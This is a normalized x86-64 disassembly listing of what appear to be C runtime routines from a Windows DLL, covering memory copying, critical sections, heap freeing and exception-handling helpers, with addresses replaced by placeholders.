test [ rax + rbx * 2 ] 0x1
je r-xdata
mov ecx ebx
call sub_180022600
test eax eax
jne r-xdata
mov rbx [ rsp + 0x70 ]
add rsp 0x50
pop rdi
pop rsi
pop rbp
retn
mov [ rsp + 0x78 ] bl
mov [ rsp + 0x79 ] 0x0
mov eax 0x1
mov eax ebx
mov [ rsp + 0x79 ] bl
mov [ rsp + 0x7a ] 0x0
sar eax 0x8
mov [ rsp + 0x78 ] al
mov eax 0x2
jmp r-xdata
test edx edx
je r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ rsp + 0x80 ]
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x38 ] ebp
lea rcx [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rcx
lea r9 [ rsp + 0x78 ]
xor ecx ecx
mov r8d 0x100
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_18002252c
test eax eax
je r-xdata
movzx ecx [ rsp + 0x81 ]
shl eax 0x8
or eax ecx
sub_18001f8d8
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180022bd8
mov edx [ rax + 0x4 ]
mov [ rbx ] edx
call sub_180022ba0
mov edx 0x2
mov ecx 0x100
mov [ rbx + 0x4 ] eax
call sub_180022c90
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
call sub_1800225c4
and [ rbx + 0x10 ] 0x0
mov [ rbx + 0x8 ] rax
call sub_1800225c4
mov rcx [ rbx + 0x8 ]
mov r8d 0x200
mov rdx rax
call sub_1800205e0
mov [ rbx + 0x10 ] 0x1
jmp r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001f968
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
[ rw-data ]
jne r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rdi [ rw-data ]
mov esi 0x4
mov rcx rdi
call InitializeCriticalSection
add rdi 0x28
dec rsi
jne r-xdata
sub_18001f9b4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
[ rw-data ] 0xffffffff
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rbx [ rw-data ]
mov edi 0x4
mov rcx rbx
call DeleteCriticalSection
add rbx 0x28
dec rdi
jne r-xdata
sub_18001f9f0
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] edx
cmp edx 0x4
jge r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
movsxd rax edx
lea rdx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rdx * 8 ]
call EnterCriticalSection
sub_18001fa48
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x8 ]
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_18001f9f0
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebx ebx
lea rcx [ rsp + 0x30 ]
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
call sub_18001fa20
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_18001faac
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x10
call sub_180021000
test rax rax
je r-xdata
mov [ rw-data ] rax
add rsp 0x20
pop rbx
retn
mov rdx [ rw-data ]
mov [ rax + 0x8 ] rbx
mov [ rax ] rdx
sub_18001fae0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx [ rcx ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_18001f9f0
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
xor edi edi
lea rcx [ rsp + 0x30 ]
cmp [ rbx + 0x8 ] rdi
cmove rdi rbx
call sub_18001fa20
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
sub_18001fbb8
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rdi rcx
xor edx edx
lea rcx [ rsp + 0x58 ]
call sub_18001f9f0
nop
mov rbx [ rdi + 0x18 ]
jmp r-xdata
test rbx rbx
jne r-xdata
dec rbx
mov rax [ rdi + 0x10 ]
cmp [ rax + rbx * 8 ] 0x0
je r-xdata
mov rcx [ rdi + 0x10 ]
call sub_18002094c
nop
lea rcx [ rsp + 0x58 ]
call sub_18001fa20
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
mov rbp [ rax + rbx * 8 ]
xor edx edx
lea rcx [ rsp + 0x50 ]
call sub_18001f9f0
mov rax [ rbp + 0x8 ]
test rax rax
je r-xdata
xor esi esi
cmp [ rbp + 0x8 ] rsi
cmove rsi rbp
lea rcx [ rsp + 0x50 ]
call sub_18001fa20
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ rbp + 0x8 ] rax
sub_18001fc80
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rcx
mov rcx [ rcx ]
mov rbx rdx
cmp rcx rdx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
test rcx rcx
je r-xdata
and [ rsi ] 0x0
test rbx rbx
je r-xdata
call sub_18002094c
cmp [ rbx ] 0x0
mov rdi rbx
je r-xdata
sub rdi rbx
lea rcx [ rdi + 0x1 ]
call sub_1800213d4
mov [ rsi ] rax
test rax rax
je r-xdata
inc rdi
cmp [ rdi ] 0x0
jne r-xdata
lea r8 [ rdi + 0x1 ]
mov rdx rbx
mov rcx rax
call sub_1800205e0
sub_18001fcf8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
xor edx edx
xor ecx ecx
call sub_180023b10
lea rcx [ r--data ]
test rax rax
cmove rax rcx
lea rcx [ rdi + 0x28 ]
mov rdx rax
call sub_18001fc80
test rbx rbx
je r-xdata
lea rax [ r--data ]
test rbx rbx
lea rcx [ rdi + 0x38 ]
cmove rbx rax
mov rdx rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp sub_18001fc80
mov rdx rbx
xor ecx ecx
call sub_180023b10
mov rbx rax
sub_18001fd64
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov edi edx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
call sub_18001fbb8
nop
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
and [ rbx + 0x28 ] 0x0
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
call sub_18002094c
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call j_sub_18002094c#2
sub_18001fdcc
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
mov rax rbx
add rsp 0x30
pop rbx
retn
xor edx edx
lea rcx [ rsp + 0x48 ]
call sub_18001f9f0
nop
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x48 ]
call sub_18001fa20
lea ecx [ rbx + 0x38 ]
call sub_180021000
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
mov [ rax + 0x8 ] 0x1
lea rax [ r--data ]
mov [ rbx ] rax
and [ rbx + 0x10 ] 0x0
and [ rbx + 0x18 ] 0x0
and [ rbx + 0x20 ] 0x0
mov [ rbx + 0x24 ] 0x0
lea rcx [ rbx + 0x28 ]
and [ rcx ] 0x0
mov [ rcx + 0x8 ] 0x0
lea rdx [ r--data ]
call sub_18001fc80
jmp r-xdata
lea rcx [ rsp + 0x40 ]
call sub_18001fa20
mov r11 [ rw-data ]
mov [ rw-data ] r11
inc rcx
mov [ rbx + 0x8 ] rcx
mov rcx rbx
call sub_18001fb84
mov [ rbx + 0x20 ] 0x3f
lea rcx [ rbx + 0x28 ]
lea rdx [ r--data ]
call sub_18001fc80
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x40 ]
call sub_18001f9f0
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
sub_18001fef0
push rbx
sub rsp 0x30
mov rax [ rcx ]
mov rbx r8
mov r8d edx
lea rdx [ rsp + 0x20 ]
call [ rax + 0x18 ]
mov rcx [ rbx + 0x8 ]
cmp [ rax + 0x8 ] rcx
jne r-xdata
xor eax eax
mov ecx [ rbx ]
cmp [ rax ] ecx
jne r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_18001ff60
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
and [ rsp + 0x38 ] 0x0
mov ecx r8d
mov rdi rdx
call sub_180023d88
and [ rdi + 0x10 ] 0x0
mov [ rdi + 0x18 ] 0xf
mov rcx rax
mov rbx rax
mov [ rdi ] 0x0
call sub_180023ce0
mov rdx rbx
mov rcx rdi
mov r8 rax
call sub_180008110
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_18001ffb4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
and [ rsp + 0x40 ] 0x0
mov rdi rdx
cmp r8d 0x1
jne r-xdata
mov ecx r8d
call sub_180023d88
and [ rdi + 0x10 ] 0x0
mov [ rdi + 0x18 ] 0xf
mov rcx rax
mov rbx rax
mov [ rdi ] 0x0
call sub_180023ce0
mov rdx rbx
and [ rdx + 0x10 ] 0x0
mov [ rdx + 0x18 ] 0xf
lea rcx [ r--data ]
mov [ rdx ] 0x0
call sub_180023ce0
lea rdx [ r--data ]
jmp r-xdata
mov r8 rax
mov rcx rdi
call sub_180008110
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_180020030
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx [ rcx + 0x38 ]
mov rdi rcx
jmp r-xdata
test rbx rbx
jne r-xdata
mov r8d [ rbx + 0x8 ]
mov rdx rdi
xor ecx ecx
call [ rbx + 0x10 ]
mov rbx [ rbx ]
mov rcx [ rdi + 0x30 ]
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x38 ]
and [ rdi + 0x30 ] 0x0
test rcx rcx
je r-xdata
mov rbx [ rcx ]
call j_sub_18002094c#2
mov rcx rbx
test rbx rbx
jne r-xdata
and [ rdi + 0x38 ] 0x0
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rbx [ rcx ]
call j_sub_18002094c#2
mov rcx rbx
test rbx rbx
jne r-xdata
sub_1800200a0
push rbx
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
mov rbx rcx
jbe r-xdata
mov rcx rbx
call sub_180020030
mov rbx [ rbx + 0x40 ]
test rbx rbx
je r-xdata
mov rax [ rbx + 0x8 ]
lea rcx [ rw-data ]
dec [ rcx + rax ]
cmp [ rcx + rax ] 0x0
jg r-xdata
add rsp 0x20
pop rbx
retn
mov rcx rbx
call sub_18000b6f0
mov rcx rbx
call j_sub_18002094c#2
sub_1800200ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x50
mov rdi rdx
movsxd rbx ecx
test rdx rdx
jne r-xdata
mov esi [ rdx ]
mov r12d [ rdx + 0x4 ]
call sub_180022bd8
mov esi [ rax + 0x8 ]
call sub_180022ba0
mov r12d eax
jmp r-xdata
mov ebp 0x2
cmp ebx 0x100
jae r-xdata
lea eax [ rbx - 0x61 ]
cmp eax 0x19
ja r-xdata
test esi esi
jne r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
jne r-xdata
mov eax ebx
jmp r-xdata
sub ebx 0x20
mov eax ebx
sar rax 0x8
movzx ecx al
mov rax [ rdi + 0x8 ]
movsx edx [ rax + rcx * 2 ]
shr edx 0xf
and edx 0x1
call sub_1800225c4
mov ecx ebx
sar ecx 0x8
movzx ecx cl
movzx edx [ rax + rcx * 2 ]
and edx 0x8000
jmp r-xdata
mov rax [ rdi + 0x8 ]
test [ rax + rbx * 2 ] bpl
je r-xdata
mov ecx ebx
call sub_180022680
test eax eax
jne r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x78 ] bl
mov [ rsp + 0x79 ] 0x0
mov ebp 0x1
mov eax ebx
mov [ rsp + 0x79 ] bl
mov [ rsp + 0x7a ] 0x0
sar eax 0x8
mov [ rsp + 0x78 ] al
jmp r-xdata
test edx edx
je r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ rsp + 0x80 ]
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x38 ] r12d
lea rax [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x78 ]
mov r8d 0x200
mov edx esi
xor ecx ecx
mov [ rsp + 0x20 ] ebp
call sub_18002252c
test eax eax
je r-xdata
movzx ecx [ rsp + 0x81 ]
shl eax 0x8
or eax ecx
sub_18002028c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rdi [ rw-data ]
mov esi 0x3e
add rdi 0x8
dec rsi
jne r-xdata
mov rcx [ rbp + 0x10 ]
mov rbx [ rbp ]
call sub_180022e6c
mov rcx rbp
call sub_18002094c
mov rbp rbx
test rbx rbx
jne r-xdata
xor ebp ebp
xchg [ rdi ] rbp
test rbp rbp
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180020330
sub rsp 0x28
mov rax [ rw-data ]
test rax rax
jne r-xdata
dec rax
mov [ rw-data ] rax
call [ EncodePointer@IAT ]
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov [ rdx + rcx * 8 ] rax
add rsp 0x28
retn
add rsp 0x28
jmp sub_1800252c8
sub_1800203a0
test rdx rdx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov rcx rdx
mov rbx rdx
call sub_180023ce0
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_1800213d4
mov [ rdi + 0x8 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_180025324
mov [ rdi + 0x10 ] 0x1
sub_180020424
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] rax
mov rdx [ rdx ]
mov rbx rcx
call sub_1800203a0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180020454
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call sub_1800203fc
cmp [ rdi + 0x10 ] 0x0
je r-xdata
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
mov rdx [ rdi + 0x8 ]
mov rcx rbx
call sub_1800203a0
jmp r-xdata
sub_1800204d4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800203fc
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_180020560
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180025388
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_1800205e0
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_180020914
sub rsp 0x28
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov ecx 0x19
call sub_1800254ec
mov edx 0x1
xor ecx ecx
call sub_180025308
add rsp 0x28
jmp sub_1800252c8
call rax
sub_18002094c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_180022de4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180022d9c
mov [ rbx ] eax
sub_18002098c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov rbp r9
mov r13 r8
mov r14 rdx
call sub_180025a78
mov r10 [ r15 ]
mov [ rbp ] r10
mov r12d eax
test edi edi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
sub rsi 0x14
dec edi
je r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
jmp r-xdata
mov rcx [ r14 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r8 [ rbx + 0x10 ]
mov r9d [ rbx + 0xc ]
add r8 [ rsp + 0x50 ]
mov r10d [ rax ]
xor ecx ecx
test r9d r9d
je r-xdata
movsxd rbx [ r13 + 0x10 ]
add rbx [ r14 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
cmp ecx r9d
jb r-xdata
lea rdx [ r8 + 0xc ]
mov rax [ r15 ]
lea rcx [ rcx + rcx * 4 ]
movsxd rcx [ r8 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rbp ] rcx
inc ecx
add rdx 0x14
cmp ecx r9d
jb r-xdata
movsxd rax [ rdx ]
cmp rax r10
je r-xdata
sub_180020ae0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r9 [ rax + 0x18 ]
mov rbp r8
mov r12 rdx
call sub_18002098c
mov rdx r12
mov rcx rbp
mov r13 rax
call sub_180025a78
movsxd rdi [ rbp + 0xc ]
mov esi eax
test edi edi
je r-xdata
xor edx edx
lea rcx [ rdi + rdi * 4 ]
lea rbx [ rcx * 4 - 0x14 ]
mov r9d [ rdx + 0x4 ]
or r9d 0xffffffff
jmp r-xdata
sub rbx 0x14
dec edi
jne r-xdata
cmp esi [ rdx + 0x8 ]
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_180023fe8
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
call sub_180025c90
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
add rdx rbx
cmp esi [ rdx + 0x4 ]
jle r-xdata
test rdx rdx
jne r-xdata
sub_180020b8c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_180025c90
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_180025c90
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_180025c90
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_180024f84
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_180020c14
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_180025c90
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_180025c90
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_180024f84
call sub_180025c90
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_180020cb8
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
and [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_180025c90
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_180020d0c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rbx [ rdx + 0xc ]
mov r12 [ rsp + 0x70 ]
mov rdi rdx
mov rcx rdi
mov rdx r12
mov r13d r9d
xor ebp ebp
call sub_180025a78
mov esi eax
test ebx ebx
jne r-xdata
mov r10 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
or r11d 0xffffffff
mov [ r10 ] r11d
mov edx ebx
mov [ r8 ] r11d
test ebx ebx
je r-xdata
call sub_1800260d0
test edx edx
je r-xdata
movsxd rcx [ rdi + 0x10 ]
lea rax [ rbx + rbx * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r12 + 0x8 ]
lea r9 [ rcx + rax - 0xc ]
xor edx edx
test ebx ebx
je r-xdata
lea eax [ rdx - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rbp [ rax + rdx * 4 ]
add rbp [ r12 + 0x8 ]
sub r9 0x14
add edx r11d
jne r-xdata
cmp esi [ r9 ]
jle r-xdata
and [ r8 ] 0x0
and [ r10 ] 0x0
xor eax eax
xor r9d r9d
cmp esi [ r9 - 0x4 ]
jle r-xdata
cmp r13d [ rcx ]
jl r-xdata
mov eax [ rbp + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
inc edx
add r9 0x14
cmp edx ebx
jb r-xdata
cmp r13d [ rcx + 0x4 ]
jg r-xdata
mov eax [ rbp + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ rdi + 0x10 ]
add rcx [ r12 + 0x8 ]
add rcx r9
test rbp rbp
je r-xdata
cmp [ r8 ] r11d
je r-xdata
mov eax [ r8 ]
cmp eax r11d
cmove eax edx
mov [ r8 ] eax
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov eax [ r8 ]
lea rcx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r12 + 0x8 ]
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_180020e38
